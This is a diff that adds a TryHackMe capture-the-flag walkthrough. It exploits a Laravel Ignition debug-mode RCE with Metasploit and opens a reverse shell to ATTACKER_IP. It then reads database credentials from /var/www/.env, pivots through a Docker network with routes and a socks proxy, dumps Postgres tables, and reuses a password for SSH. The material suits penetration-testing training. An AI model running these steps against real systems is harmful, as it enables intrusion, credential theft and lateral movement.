@@ -149,6 +149,113 @@ curl --proxy socks4a://localhost:9050 http://MACHINE_IP
 proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP
 
 
+                                                    ## Challenge Walkthrough
+# The application may be vulnerable to a remote code execution exploit which impacts Laravel applications using debug mode with Laravel versions before 8.4.2, which use ignite as a developer dependency.
+# We can use Metasploit to verify if the application is vulnerable to this exploit.
+# Note: be sure to set the HttpClientTimeout=20, or the check may fail. In extreme situations where your connection is really slow/unstable, you may need a value higher than 20 seconds.
+# After loading the web application in our browser at http://MACHINE_IP:80 (use Firefox on the Kali web-Machine) and inspecting the Network tab, we can see that the server responds with an HTTP Set-Cookie header indicating that the server is running Laravel - a common web application development framework:
+
+STEP 1: nmap -T4 -A -Pn MACHINE_IP
+STEP 2: $ msfconsole
+STEP 3: msf6 > use multi/php/ignition_laravel_debug_rce
+STEP 4: check rhost=MACHINE_IP HttpClientTimeout=20
+
+NOTE: The IP address you need will start with 10.x.x.x. Remember, you will either need to use eth0 or tun0, depending on whether or not you are using the TryHackMe Kali Web-Machine.
+
+<> Now that we’ve confirmed the vulnerability, let’s run the module to open a new session:
+
+# run rhost=MACHINE_IP lhost=ATTACKER_IP HttpClientTimeout=20
+
+<> The opened shell will be a basic cmd/unix/reverse_bash shell. We can see this by running the background command and viewing the currently active sessions:
+
+# To upgrade the most recently opened session to Meterpreter, use the sessions -u -1 command.
+# Metasploit will now show two sessions opened - one for the original shell session and another for the new Meterpreter session:
+
+# After interacting with the Meterpreter session with sessions -i -1 and exploring the application, we can see there are database credentials available:
+
+STEP 1: meterpreter > cat /var/www/.env
+STEP 2: resolve webservice_database
+
+# As this is an internal IP address, it won’t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host.
+# To configure the global routing table in msfconsole, ensure you have run the background command from within a Meterpreter session:
+
+STEP 3: route add 172.28.101.51/32 -1
+
+# We can also see, due to the presence of the /.dockerenv file, that we are in a docker container. By default, Docker chooses a hard-coded IP to represent the host machine. We will also add that to our routing table for later scanning:
+
+STEP 4: route add 172.17.0.1/32 -1
+STEP 5: route print
+
+# With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target Postgres. Starting with a schema dump, followed by running queries to select information out of the database:
+
+           
+# Dump the schema
+use auxiliary/scanner/postgres/postgres_schemadump
+run postgres://postgres:postgres@172.28.101.51/postgres
+
+# Select information from a specific table
+use auxiliary/admin/postgres/postgres_sql
+run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
+
+<> To further pivot through the private network, we can create a socks proxy within Metasploit:
+STEP 6: msf6 > use auxiliary/server/socks_proxy
+STEP 7: msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
+
+# This will expose a port on the attacker machine that can be used to run other network tools through, such as curl or proxychains
+
+           
+# From the attacker’s host machine, we can use curl with the internal Docker IP to show that the web application is running, and the socks proxy works
+$ curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v
+
+… etc …
+
+# From the attacker’s host machine, we can use ProxyChains to scan the compromised host machine for common ports
+$ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 08:48 EDT
+Nmap scan report for 172.17.0.1
+Host is up (0.069s latency).
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  closed https
+5432/tcp closed postgresql
+
+Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
+
+# With the host scanned, we can see that port 22 is open on the host machine. 
+# It also is possible that Santa has re-used his password, and it’s possible to SSH into the host machine from the Docker container to grab the flag:   
+
+STEP 6: msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
+STEP 7: msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa_username_here:santa_password_here@172.17.0.1
+STEP 8: sessions
+STEP 9: msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i -1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+
+
         
         
 
